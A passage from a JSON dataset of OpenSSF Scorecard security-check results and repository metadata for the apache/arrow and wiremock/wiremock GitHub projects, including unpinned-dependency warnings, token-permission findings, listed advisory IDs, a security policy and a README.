                        "Warn: pipCommand not pinned by hash: .github/workflows/archery.yml:76",
                        "Warn: pipCommand not pinned by hash: .github/workflows/comment_bot.yml:49",
                        "Warn: pipCommand not pinned by hash: .github/workflows/comment_bot.yml:105",
                        "Warn: pipCommand not pinned by hash: .github/workflows/comment_bot.yml:106",
                        "Warn: pipCommand not pinned by hash: .github/workflows/cpp.yml:161",
                        "Warn: pipCommand not pinned by hash: .github/workflows/cpp.yml:164",
                        "Warn: pipCommand not pinned by hash: .github/workflows/dev.yml:127",
                        "Warn: pipCommand not pinned by hash: .github/workflows/dev.yml:58",
                        "Warn: pipCommand not pinned by hash: .github/workflows/dev.yml:70",
                        "Warn: pipCommand not pinned by hash: .github/workflows/docs.yml:60",
                        "Warn: pipCommand not pinned by hash: .github/workflows/docs_light.yml:67",
                        "Warn: pipCommand not pinned by hash: .github/workflows/integration.yml:109",
                        "Warn: pipCommand not pinned by hash: .github/workflows/java.yml:91",
                        "Warn: pipCommand not pinned by hash: .github/workflows/java_jni.yml:127",
                        "Warn: pipCommand not pinned by hash: .github/workflows/java_jni.yml:85",
                        "Warn: pipCommand not pinned by hash: .github/workflows/java_nightly.yml:68",
                        "Warn: pipCommand not pinned by hash: .github/workflows/js.yml:69",
                        "Warn: pipCommand not pinned by hash: .github/workflows/pr_bot.yml:90",
                        "Warn: pipCommand not pinned by hash: .github/workflows/python.yml:193",
                        "Warn: pipCommand not pinned by hash: .github/workflows/python.yml:216",
                        "Warn: pipCommand not pinned by hash: .github/workflows/python.yml:122",
                        "Warn: pipCommand not pinned by hash: .github/workflows/r.yml:222",
                        "Warn: pipCommand not pinned by hash: .github/workflows/r.yml:163",
                        "Warn: pipCommand not pinned by hash: .github/workflows/r_nightly.yml:70",
                        "Warn: pipCommand not pinned by hash: .github/workflows/ruby.yml:98",
                        "Warn: pipCommand not pinned by hash: .github/workflows/swift.yml:72",
                        "Info:  72 out of 121 GitHub-owned GitHubAction dependencies pinned",
                        "Info:   5 out of  20 third-party GitHubAction dependencies pinned",
                        "Info:   0 out of  94 pipCommand dependencies pinned",
                        "Info:   0 out of   6 npmCommand dependencies pinned",
                        "Info:   0 out of   7 chocoCommand dependencies pinned",
                        "Info:   1 out of   1 goCommand dependencies pinned",
                        "Info:   0 out of  75 containerImage dependencies pinned",
                        "Info:   0 out of   5 downloadThenRun dependencies pinned"
                    ],
                    "score": 0,
                    "reason": "dependency not pinned by hash detected -- score normalized to 0",
                    "name": "Pinned-Dependencies",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#pinned-dependencies",
                        "short": "Determines if the project has declared and pinned the dependencies of its build process."
                    }
                },
                {
                    "details": [
                        "Warn: 0 commits out of 30 are checked with a SAST tool"
                    ],
                    "score": 0,
                    "reason": "SAST tool is not run on all commits -- score normalized to 0",
                    "name": "SAST",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#sast",
                        "short": "Determines if the project uses static code analysis."
                    }
                },
                {
                    "details": [
                        "Info: security policy file detected: github.com/apache/.github/.github/SECURITY.md:1",
                        "Info: Found linked content: github.com/apache/.github/.github/SECURITY.md:1",
                        "Info: Found disclosure, vulnerability, and/or timelines in security policy: github.com/apache/.github/.github/SECURITY.md:1",
                        "Info: Found text in security policy: github.com/apache/.github/.github/SECURITY.md:1"
                    ],
                    "score": 10,
                    "reason": "security policy file detected",
                    "name": "Security-Policy",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#security-policy",
                        "short": "Determines if the project has published a security policy."
                    }
                },
                {
                    "details": [
                        "Info: signed release artifact: matlab-arrow-18.0.0.mltbx.asc: https://api.github.com/repos/apache/arrow/releases/assets/202288752",
                        "Info: signed release artifact: matlab-arrow-18.0.0.mltbx.asc: https://api.github.com/repos/apache/arrow/releases/assets/199677095",
                        "Info: signed release artifact: matlab-arrow-17.0.0.mltbx.asc: https://api.github.com/repos/apache/arrow/releases/assets/179848419",
                        "Info: signed release artifact: matlab-arrow-17.0.0.mltbx.asc: https://api.github.com/repos/apache/arrow/releases/assets/179062050",
                        "Warn: release artifact apache-arrow-17.0.0-rc1 not signed: https://api.github.com/repos/apache/arrow/releases/164639050",
                        "Warn: release artifact apache-arrow-18.0.0 does not have provenance: https://api.github.com/repos/apache/arrow/releases/182193262",
                        "Warn: release artifact apache-arrow-18.0.0-rc0 does not have provenance: https://api.github.com/repos/apache/arrow/releases/180184541",
                        "Warn: release artifact apache-arrow-17.0.0 does not have provenance: https://api.github.com/repos/apache/arrow/releases/165584429",
                        "Warn: release artifact apache-arrow-17.0.0-rc2 does not have provenance: https://api.github.com/repos/apache/arrow/releases/164955245",
                        "Warn: release artifact apache-arrow-17.0.0-rc1 does not have provenance: https://api.github.com/repos/apache/arrow/releases/164639050"
                    ],
                    "score": 6,
                    "reason": "4 out of the last 5 releases have a total of 4 signed artifacts.",
                    "name": "Signed-Releases",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#signed-releases",
                        "short": "Determines if the project cryptographically signs release artifacts."
                    }
                },
                {
                    "details": [
                        "Info: topLevel 'contents' permission set to 'read': .github/workflows/archery.yml:50",
                        "Info: topLevel 'contents' permission set to 'read': .github/workflows/comment_bot.yml:28",
                        "Info: topLevel 'contents' permission set to 'read': .github/workflows/cpp.yml:64",
                        "Info: topLevel 'contents' permission set to 'read': .github/workflows/csharp.yml:42",
                        "Info: topLevel 'contents' permission set to 'read': .github/workflows/dev.yml:35",
                        "Info: topLevel 'contents' permission set to 'read': .github/workflows/dev_pr.yml:37",
                        "Info: topLevel 'contents' permission set to 'read': .github/workflows/docs.yml:24",
                        "Info: topLevel 'contents' permission set to 'read': .github/workflows/docs_light.yml:34",
                        "Info: topLevel 'contents' permission set to 'read': .github/workflows/integration.yml:60",
                        "Info: topLevel 'contents' permission set to 'read': .github/workflows/issue_bot.yml:26",
                        "Info: topLevel 'contents' permission set to 'read': .github/workflows/java.yml:52",
                        "Info: topLevel 'contents' permission set to 'read': .github/workflows/java_jni.yml:52",
                        "Info: topLevel 'contents' permission set to 'read': .github/workflows/java_nightly.yml:35",
                        "Info: topLevel 'contents' permission set to 'read': .github/workflows/js.yml:46",
                        "Info: topLevel 'contents' permission set to 'read': .github/workflows/matlab.yml:44",
                        "Info: topLevel 'contents' permission set to 'read': .github/workflows/pr_bot.yml:31",
                        "Info: topLevel 'contents' permission set to 'read': .github/workflows/pr_review_trigger.yml:22",
                        "Info: topLevel 'contents' permission set to 'read': .github/workflows/python.yml:48",
                        "Info: topLevel 'contents' permission set to 'read': .github/workflows/r.yml:58",
                        "Info: topLevel 'contents' permission set to 'read': .github/workflows/r_nightly.yml:40",
                        "Warn: topLevel 'contents' permission set to 'write': .github/workflows/release.yml:28",
                        "Warn: topLevel 'contents' permission set to 'write': .github/workflows/release_candidate.yml:28",
                        "Info: topLevel 'contents' permission set to 'read': .github/workflows/ruby.yml:60",
                        "Info: topLevel 'contents' permission set to 'read': .github/workflows/swift.yml:48",
                        "Info: no jobLevel write permissions found"
                    ],
                    "score": 0,
                    "reason": "detected GitHub workflow tokens with excessive permissions",
                    "name": "Token-Permissions",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#token-permissions",
                        "short": "Determines if the project's workflows follow the principle of least privilege."
                    }
                },
                {
                    "details": [
                        "Warn: Project is vulnerable to: CVE-2021-46141",
                        "Warn: Project is vulnerable to: CVE-2021-46142",
                        "Warn: Project is vulnerable to: CVE-2024-34402",
                        "Warn: Project is vulnerable to: CVE-2024-34403",
                        "Warn: Project is vulnerable to: GHSA-grv7-fg5c-xmjg",
                        "Warn: Project is vulnerable to: GHSA-952p-6rrq-rcjv",
                        "Warn: Project is vulnerable to: GHSA-7fh5-64p2-3v2j",
                        "Warn: Project is vulnerable to: GHSA-4vvj-4cpr-p986"
                    ],
                    "score": 2,
                    "reason": "8 existing vulnerabilities detected",
                    "name": "Vulnerabilities",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#vulnerabilities",
                        "short": "Determines if the project has open, known unfixed vulnerabilities."
                    }
                }
            ],
            "metadata": null
        },
        "SecurityPolicy_url_endpoint": "https://api.github.com/repos/apache/.github/contents/.github/SECURITY.md",
        "SecurityPolicy_content": "# Security Policy\n\nThis is a project of the [Apache Software Foundation](https://apache.org) and follows the ASF [vulnerability handling process](https://apache.org/security/#vulnerability-handling).\n\n## Reporting a Vulnerability\n\nTo report a new vulnerability you have discovered please follow the [ASF vulnerability reporting process](https://apache.org/security/#reporting-a-vulnerability).\n",
        "project_all_labels": [
            ".NET",
            "awaiting change review",
            "awaiting changes",
            "awaiting committer review",
            "awaiting merge",
            "awaiting review",
            "backport-candidate",
            "Breaking Change",
            "Component: Archery",
            "Component: Benchmarking",
            "Component: C",
            "Component: C#",
            "Component: C++",
            "Component: C++ - Gandiva",
            "Component: C++ - Plasma",
            "Component: Continuous Integration",
            "Component: Developer Tools",
            "Component: Documentation",
            "Component: FlightRPC",
            "Component: Format",
            "Component: GLib",
            "Component: Go",
            "Component: GPU",
            "Component: Integration",
            "Component: Java",
            "Component: JavaScript",
            "Component: Julia",
            "Component: MATLAB",
            "Component: Other",
            "Component: Packaging",
            "Component: Parquet",
            "Component: Python",
            "Component: R",
            "Component: Release",
            "Component: Ruby",
            "Component: Rust",
            "Component: Rust - Ballista",
            "Component: Rust - DataFusion",
            "Component: Swift",
            "Component: Website",
            "Component: Wiki",
            "Critical Fix",
            "dependencies",
            "github_actions",
            "go",
            "good-first-issue",
            "good-second-issue",
            "hacktoberfest-accepted",
            "installation",
            "java",
            "javascript",
            "needs-rebase",
            "Priority: Blocker",
            "Priority: Critical",
            "Priority: Major",
            "Priority: Medium",
            "Priority: Minor",
            "Priority: Trivial",
            "ready-for-review",
            "Type: bug",
            "Type: enhancement",
            "Type: task",
            "Type: test",
            "Type: usage",
            "WIP"
        ],
        "README_content": "<!---\n  Licensed to the Apache Software Foundation (ASF) under one\n  or more contributor license agreements.  See the NOTICE file\n  distributed with this work for additional information\n  regarding copyright ownership.  The ASF licenses this file\n  to you under the Apache License, Version 2.0 (the\n  \"License\"); you may not use this file except in compliance\n  with the License.  You may obtain a copy of the License at\n\n    http://www.apache.org/licenses/LICENSE-2.0\n\n  Unless required by applicable law or agreed to in writing,\n  software distributed under the License is distributed on an\n  \"AS IS\" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY\n  KIND, either express or implied.  See the License for the\n  specific language governing permissions and limitations\n  under the License.\n-->\n\n# Apache Arrow\n\n[![Fuzzing Status](https://oss-fuzz-build-logs.storage.googleapis.com/badges/arrow.svg)](https://bugs.chromium.org/p/oss-fuzz/issues/list?sort=-opened&can=1&q=proj:arrow)\n[![License](http://img.shields.io/:license-Apache%202-blue.svg)](https://github.com/apache/arrow/blob/main/LICENSE.txt)\n[![Twitter Follow](https://img.shields.io/twitter/follow/apachearrow.svg?style=social&label=Follow)](https://twitter.com/apachearrow)\n\n## Powering In-Memory Analytics\n\nApache Arrow is a universal columnar format and multi-language toolbox for fast\ndata interchange and in-memory analytics. It contains a set of technologies that\nenable data systems to efficiently store, process, and move data.\n\nMajor components of the project include:\n\n - [The Arrow Columnar In-Memory Format](https://arrow.apache.org/docs/dev/format/Columnar.html):\n   a standard and efficient in-memory representation of various datatypes, plain or nested\n - [The Arrow IPC Format](https://arrow.apache.org/docs/dev/format/Columnar.html#serialization-and-interprocess-communication-ipc):\n   an efficient serialization of the Arrow format and associated metadata,\n   for communication between processes and heterogeneous environments\n - [The Arrow Flight RPC protocol](https://github.com/apache/arrow/tree/main/format/Flight.proto):\n   based on the Arrow IPC format, a building block for remote services exchanging\n   Arrow data with application-defined semantics (for example a storage server or a database)\n - [C++ libraries](https://github.com/apache/arrow/tree/main/cpp)\n - [C bindings using GLib](https://github.com/apache/arrow/tree/main/c_glib)\n - [C# .NET libraries](https://github.com/apache/arrow/tree/main/csharp)\n - [Gandiva](https://github.com/apache/arrow/tree/main/cpp/src/gandiva):\n   an [LLVM](https://llvm.org)-based Arrow expression compiler, part of the C++ codebase\n - [Go libraries](https://github.com/apache/arrow-go)\n - [Java libraries](https://github.com/apache/arrow/tree/main/java)\n - [JavaScript libraries](https://github.com/apache/arrow/tree/main/js)\n - [Python libraries](https://github.com/apache/arrow/tree/main/python)\n - [R libraries](https://github.com/apache/arrow/tree/main/r)\n - [Ruby libraries](https://github.com/apache/arrow/tree/main/ruby)\n - [Rust libraries](https://github.com/apache/arrow-rs)\n\nArrow is an [Apache Software Foundation](https://www.apache.org) project. Learn more at\n[arrow.apache.org](https://arrow.apache.org).\n\n## What's in the Arrow libraries?\n\nThe reference Arrow libraries contain many distinct software components:\n\n- Columnar vector and table-like containers (similar to data frames) supporting\n  flat or nested types\n- Fast, language agnostic metadata messaging layer (using Google's Flatbuffers\n  library)\n- Reference-counted off-heap buffer memory management, for zero-copy memory\n  sharing and handling memory-mapped files\n- IO interfaces to local and remote filesystems\n- Self-describing binary wire formats (streaming and batch/file-like) for\n  remote procedure calls (RPC) and interprocess communication (IPC)\n- Integration tests for verifying binary compatibility between the\n  implementations (e.g. sending data from Java to C++)\n- Conversions to and from other in-memory data structures\n- Readers and writers for various widely-used file formats (such as Parquet, CSV)\n\n## Implementation status\n\nThe official Arrow libraries in this repository are in different stages of\nimplementing the Arrow format and related features.  See our current\n[feature matrix](https://arrow.apache.org/docs/dev/status.html)\non git main.\n\n## How to Contribute\n\nPlease read our latest [project contribution guide][5].\n\n## Getting involved\n\nEven if you do not plan to contribute to Apache Arrow itself or Arrow\nintegrations in other projects, we'd be happy to have you involved:\n\n- Join the mailing list: send an email to\n  [dev-subscribe@arrow.apache.org][1]. Share your ideas and use cases for the\n  project.\n- Follow our activity on [GitHub issues][3]\n- [Learn the format][2]\n- Contribute code to one of the reference implementations\n\n[1]: mailto:dev-subscribe@arrow.apache.org\n[2]: https://github.com/apache/arrow/tree/main/format\n[3]: https://github.com/apache/arrow/issues\n[4]: https://github.com/apache/arrow\n[5]: https://arrow.apache.org/docs/dev/developers/index.html\n",
        "num_commits": 16828,
        "project_age_days": 3177,
        "project_created_at": "2016-02-17",
        "latest_updated_at": "2024-10-30",
        "latest_pushed_at": "2024-10-30",
        "num_contributors": 369,
        "num_pull": 18757,
        "num_issues": 44507,
        "num_opening_issue": 4799,
        "project_size(kB)": 201183,
        "num_stargazers": 14495,
        "num_watchers": 14495,
        "num_forks": 3525,
        "num_subscribers": 351,
        "SecurityPolicy_created_at": "2021-07-19 11:31:44",
        "SecurityPolicy_commit_history": [
            {
                "commit_id": "c5e16821126392a9613ee5def9d1cce56a1f64bf",
                "url": "https://github.com/apache/.github/commit/c5e16821126392a9613ee5def9d1cce56a1f64bf",
                "date": "2021-07-19 11:31:44"
            }
        ],
        "project_security_labels": [],
        "security_issues": [],
        "SecurityPolicy_reporting_mechanism": "external",
        "num_security_issues_after_policy": 0,
        "num_security_issue_and_pull": 0,
        "security_issues_created_after_policy": [],
        "SecurityPolicy_content_category": [
            "Generic policy",
            "Reporting mechanism"
        ],
        "num_noncompliant_security_discuss_issue": 0,
        "num_noncompliant_security_pull": 0,
        "has_generic_policy": true
    },
    {
        "project_name": "wiremock/wiremock",
        "project_url": "https://github.com/wiremock/wiremock",
        "SSF": {
            "date": "2024-10-29T22:28:05+07:00",
            "repo": {
                "name": "github.com/wiremock/wiremock",
                "commit": "53dfb6e2a69d610753340916c2484363f8feedaf"
            },
            "scorecard": {
                "version": "5.0.0",
                "commit": "ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4"
            },
            "score": 6.1,
            "checks": [
                {
                    "details": [
                        "Warn: binary detected: gradle/wrapper/gradle-wrapper.jar:1",
                        "Warn: binary detected: perf-test/gradle/wrapper/gradle-wrapper.jar:1",
                        "Warn: binary detected: test-extension/test-extension.jar:1"
                    ],
                    "score": 7,
                    "reason": "binaries present in source code",
                    "name": "Binary-Artifacts",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#binary-artifacts",
                        "short": "Determines if the project has generated executable (binary) artifacts in the source repository."
                    }
                },
                {
                    "details": [
                        "Info: 'allow deletion' disabled on branch 'master'",
                        "Info: 'force pushes' disabled on branch 'master'",
                        "Warn: branch 'master' does not require approvers",
                        "Warn: codeowners review is not required on branch 'master'",
                        "Warn: no status checks found to merge onto branch 'master'"
                    ],
                    "score": 3,
                    "reason": "branch protection is not maximal on development and all release branches",
                    "name": "Branch-Protection",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#branch-protection",
                        "short": "Determines if the default and release branches are protected with GitHub's branch protection settings."
                    }
                },
                {
                    "details": null,
                    "score": 10,
                    "reason": "15 out of 15 merged PRs checked by a CI test -- score normalized to 10",
                    "name": "CI-Tests",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#ci-tests",
                        "short": "Determines if the project runs tests before pull requests are merged."
                    }
                },
                {
                    "details": null,
                    "score": 0,
                    "reason": "no effort to earn an OpenSSF best practices badge detected",
                    "name": "CII-Best-Practices",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#cii-best-practices",
                        "short": "Determines if the project has an OpenSSF (formerly CII) Best Practices Badge."
                    }
                },
                {
                    "details": null,
                    "score": 4,
                    "reason": "Found 2/5 approved changesets -- score normalized to 4",
                    "name": "Code-Review",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#code-review",
                        "short": "Determines if the project requires human code review before pull requests (aka merge requests) are merged."
                    }
                },
                {
                    "details": [
                        "Info: winsw contributor org/company found, behance contributor org/company found, HackSocNotts contributor org/company found, Softwire contributor org/company found, playframework contributor org/company found, jenkinsci contributor org/company found, keptn contributor org/company found, heirloom-io contributor org/company found, granet-consulting contributor org/company found, stapler contributor org/company found, gradle contributor org/company found, todogroup contributor org/company found, api-neuchatel contributor org/company found, jewmich contributor org/company found, elastic contributor org/company found, chbatey contributor org/company found, wiremock contributor org/company found, gradle @jenkinsci @wiremock @testcontainers contributor org/company found, apache contributor org/company found, optum contributor org/company found, librecores contributor org/company found, cdevents contributor org/company found, futurerussia-ch contributor org/company found, phpminds contributor org/company found, oapi-codegen contributor org/company found, scassandra contributor org/company found, energizedwork contributor org/company found, jenkins-ru contributor org/company found, GitHub-JenkinsDay contributor org/company found, blockhq contributor org/company found, akka contributor org/company found, wiremock-inc contributor org/company found, cdfoundation contributor org/company found, open-feature contributor org/company found, adobe contributor org/company found, mongock contributor org/company found, traffic parrot contributor org/company found, aiven contributor org/company found, spbspu-kspt contributor org/company found, "
                    ],
                    "score": 10,
                    "reason": "project has 39 contributing companies or organizations",
                    "name": "Contributors",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#contributors",
                        "short": "Determines if the project has a set of contributors from multiple organizations (e.g., companies)."
                    }
                },
                {
                    "details": null,
                    "score": 10,
                    "reason": "no dangerous workflow patterns detected",
                    "name": "Dangerous-Workflow",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#dangerous-workflow",
                        "short": "Determines if the project's GitHub Action workflows avoid dangerous patterns."
                    }
                },
                {
                    "details": [
                        "Info: detected update tool: Dependabot: .github/dependabot.yml:1"
                    ],
                    "score": 10,
                    "reason": "update tool detected",
                    "name": "Dependency-Update-Tool",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#dependency-update-tool",
                        "short": "Determines if the project uses a dependency update tool."
                    }
                },
                {
                    "details": [
                        "Warn: no fuzzer integrations found"
                    ],
                    "score": 0,
                    "reason": "project is not fuzzed",
                    "name": "Fuzzing",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#fuzzing",
                        "short": "Determines if the project uses fuzzing."
                    }
                },
                {
                    "details": [
                        "Info: project has a license file: LICENSE.txt:0",
                        "Info: FSF or OSI recognized license: Apache License 2.0: LICENSE.txt:0"
                    ],
                    "score": 10,
                    "reason": "license file detected",
                    "name": "License",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#license",
                        "short": "Determines if the project has defined a license."
                    }
                },
                {
                    "details": null,
                    "score": 10,
                    "reason": "30 commit(s) and 4 issue activity found in the last 90 days -- score normalized to 10",
                    "name": "Maintained",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#maintained",
                        "short": "Determines if the project is \"actively maintained\"."
                    }
                },
                {
                    "details": [
                        "Info: Project packages its releases by way of GitHub Actions.: .github/workflows/publish-snapshot.yml:8"
                    ],
                    "score": 10,
                    "reason": "packaging workflow detected",
                    "name": "Packaging",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#packaging",
                        "short": "Determines if the project is published as a package that others can easily download, install, easily update, and uninstall."
                    }
                },
                {
                    "details": [
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/build-and-test.yml:24: update your workflow using https://app.stepsecurity.io/secureworkflow/wiremock/wiremock/build-and-test.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/build-and-test.yml:28: update your workflow using https://app.stepsecurity.io/secureworkflow/wiremock/wiremock/build-and-test.yml/master?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/build-and-test.yml:33: update your workflow using https://app.stepsecurity.io/secureworkflow/wiremock/wiremock/build-and-test.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/build-and-test.yml:40: update your workflow using https://app.stepsecurity.io/secureworkflow/wiremock/wiremock/build-and-test.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/build-and-test.yml:58: update your workflow using https://app.stepsecurity.io/secureworkflow/wiremock/wiremock/build-and-test.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/build-and-test.yml:76: update your workflow using https://app.stepsecurity.io/secureworkflow/wiremock/wiremock/build-and-test.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/build-and-test.yml:80: update your workflow using https://app.stepsecurity.io/secureworkflow/wiremock/wiremock/build-and-test.yml/master?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/build-and-test.yml:85: update your workflow using https://app.stepsecurity.io/secureworkflow/wiremock/wiremock/build-and-test.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/build-and-test.yml:92: update your workflow using https://app.stepsecurity.io/secureworkflow/wiremock/wiremock/build-and-test.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/build-and-test.yml:104: update your workflow using https://app.stepsecurity.io/secureworkflow/wiremock/wiremock/build-and-test.yml/master?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/changelog-draft.yml:14: update your workflow using https://app.stepsecurity.io/secureworkflow/wiremock/wiremock/changelog-draft.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/publish-snapshot.yml:16: update your workflow using https://app.stepsecurity.io/secureworkflow/wiremock/wiremock/publish-snapshot.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/publish-snapshot.yml:18: update your workflow using https://app.stepsecurity.io/secureworkflow/wiremock/wiremock/publish-snapshot.yml/master?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/publish-snapshot.yml:23: update your workflow using https://app.stepsecurity.io/secureworkflow/wiremock/wiremock/publish-snapshot.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/publish-snapshot.yml:45: update your workflow using https://app.stepsecurity.io/secureworkflow/wiremock/wiremock/publish-snapshot.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/publish-snapshot.yml:47: update your workflow using https://app.stepsecurity.io/secureworkflow/wiremock/wiremock/publish-snapshot.yml/master?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/publish-snapshot.yml:52: update your workflow using https://app.stepsecurity.io/secureworkflow/wiremock/wiremock/publish-snapshot.yml/master?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/publish-test-results.yml:32: update your workflow using https://app.stepsecurity.io/secureworkflow/wiremock/wiremock/publish-test-results.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/release.yml:13: update your workflow using https://app.stepsecurity.io/secureworkflow/wiremock/wiremock/release.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/release.yml:15: update your workflow using https://app.stepsecurity.io/secureworkflow/wiremock/wiremock/release.yml/master?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/release.yml:20: update your workflow using https://app.stepsecurity.io/secureworkflow/wiremock/wiremock/release.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/release.yml:41: update your workflow using https://app.stepsecurity.io/secureworkflow/wiremock/wiremock/release.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/release.yml:43: update your workflow using https://app.stepsecurity.io/secureworkflow/wiremock/wiremock/release.yml/master?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/release.yml:48: update your workflow using https://app.stepsecurity.io/secureworkflow/wiremock/wiremock/release.yml/master?enable=pin",
                        "Info:   0 out of  16 GitHub-owned GitHubAction dependencies pinned",
                        "Info:   0 out of   8 third-party GitHubAction dependencies pinned"
                    ],
                    "score": 0,
                    "reason": "dependency not pinned by hash detected -- score normalized to 0",
                    "name": "Pinned-Dependencies",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#pinned-dependencies",
                        "short": "Determines if the project has declared and pinned the dependencies of its build process."
                    }
                },
                {
                    "details": [
                        "Warn: 0 commits out of 29 are checked with a SAST tool"
                    ],
                    "score": 0,
                    "reason": "SAST tool is not run on all commits -- score normalized to 0",
                    "name": "SAST",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#sast",
                        "short": "Determines if the project uses static code analysis."
                    }
                },
                {
                    "details": [
                        "Info: security policy file detected: github.com/wiremock/.github/SECURITY.md:1",
                        "Info: Found linked content: github.com/wiremock/.github/SECURITY.md:1",
                        "Info: Found disclosure, vulnerability, and/or timelines in security policy: github.com/wiremock/.github/SECURITY.md:1",
                        "Info: Found text in security policy: github.com/wiremock/.github/SECURITY.md:1"
                    ],
                    "score": 10,
                    "reason": "security policy file detected",
                    "name": "Security-Policy",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#security-policy",
                        "short": "Determines if the project has published a security policy."
                    }
                },
                {
                    "details": null,
                    "score": -1,
                    "reason": "no releases found",
                    "name": "Signed-Releases",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#signed-releases",
                        "short": "Determines if the project cryptographically signs release artifacts."
                    }
                },
                {
                    "details": [
                        "Info: jobLevel 'contents' permission set to 'read': .github/workflows/publish-snapshot.yml:12",
                        "Info: jobLevel 'contents' permission set to 'read': .github/workflows/publish-snapshot.yml:41",
                        "Info: jobLevel 'contents' permission set to 'read': .github/workflows/release.yml:10",
                        "Info: jobLevel 'contents' permission set to 'read': .github/workflows/release.yml:38",
                        "Warn: no topLevel permission defined: .github/workflows/build-and-test.yml:1",
                        "Warn: no topLevel permission defined: .github/workflows/changelog-draft.yml:1",
                        "Warn: no topLevel permission defined: .github/workflows/publish-snapshot.yml:1",
                        "Warn: no topLevel permission defined: .github/workflows/publish-test-results.yml:1",
                        "Warn: no topLevel permission defined: .github/workflows/release.yml:1",
                        "Info: no jobLevel write permissions found"
                    ],
                    "score": 0,
                    "reason": "detected GitHub workflow tokens with excessive permissions",
                    "name": "Token-Permissions",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#token-permissions",
                        "short": "Determines if the project's workflows follow the principle of least privilege."
                    }
                },
                {
                    "details": [
                        "Warn: Project is vulnerable to: GHSA-78wr-2p64-hpwj"
                    ],
                    "score": 9,
